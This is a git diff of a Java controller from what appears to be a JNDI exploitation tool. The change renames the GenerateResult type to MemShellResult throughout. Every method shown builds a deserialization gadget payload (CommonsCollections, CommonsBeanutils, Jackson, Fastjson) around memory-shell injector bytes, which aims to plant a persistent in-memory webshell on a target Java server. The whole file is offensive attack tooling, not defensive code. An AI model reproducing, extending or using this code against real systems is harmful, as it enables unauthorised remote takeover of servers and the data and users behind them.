@@ -1,6 +1,6 @@
 package map.jndi.controller;
 
-import com.reajason.javaweb.memshell.config.GenerateResult;
+import com.reajason.javaweb.memshell.MemShellResult;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
@@ -57,7 +57,7 @@ public class DeserializeController implements Controller {
     public byte[] CommonsCollectionsK1MemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [CommonsCollectionsK1] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -84,7 +84,7 @@ public class DeserializeController implements Controller {
     public byte[] CommonsCollectionsK2MemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [CommonsCollectionsK2] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -125,7 +125,7 @@ public class DeserializeController implements Controller {
     public byte[] CommonsBeanutils183MemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [CommonsBeanutils183] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -152,7 +152,7 @@ public class DeserializeController implements Controller {
     public byte[] CommonsBeanutils194MemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [CommonsBeanutils194] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -179,7 +179,7 @@ public class DeserializeController implements Controller {
     public byte[] JacksonMemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [Jackson] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -206,7 +206,7 @@ public class DeserializeController implements Controller {
     public byte[] Jackson17AMemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [Jackson17A] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -233,7 +233,7 @@ public class DeserializeController implements Controller {
     public byte[] Jackson17BMemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [Jackson17B] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -260,7 +260,7 @@ public class DeserializeController implements Controller {
     public byte[] Fastjson1MemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [Fastjson1] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
@@ -287,7 +287,7 @@ public class DeserializeController implements Controller {
     public byte[] Fastjson2MemShell(String server, String tool, String type) throws Exception {
         System.out.println("[Deserialize] [Fastjson2] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.create(result.getInjectorBytes());
